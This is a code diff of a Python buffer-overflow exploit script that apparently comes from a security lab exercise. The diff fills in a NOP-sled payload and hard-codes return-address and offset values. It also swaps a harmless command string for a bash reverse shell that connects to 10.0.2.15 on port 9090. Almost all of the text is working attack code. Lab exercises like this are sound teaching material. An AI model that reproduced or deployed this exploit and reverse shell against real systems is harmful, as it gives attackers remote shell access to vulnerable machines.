@@ -14,7 +14,8 @@ shellcode = (
    # so the command string ends here.
    # You can delete/add spaces, if needed, to keep the position the same. 
    # The * in this line serves as the position marker         * 
-   "/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
+   # "/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
+   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
    "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
    "BBBB"   # Placeholder for argv[1] --> "-c"
    "CCCC"   # Placeholder for argv[2] --> the command string
@@ -26,13 +27,13 @@ content = bytearray(0x90 for i in range(517))
 
 ##################################################################
 # Put the shellcode somewhere in the payload
-start = 0               # Change this number 
-content[start:start + len(shellcode)] = shellcode
+start = 517-len(shellcode)               # Change this number 
+content[start:] = shellcode
 
 # Decide the return address value 
 # and put it somewhere in the payload
-ret    = 0xAABBCCDD     # Change this number 
-offset = 0              # Change this number 
+ret    = 0xffffd398+8     # Change this number
+offset = 0xffffd398-0xffffd328+4               # Change this number 
 
 # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
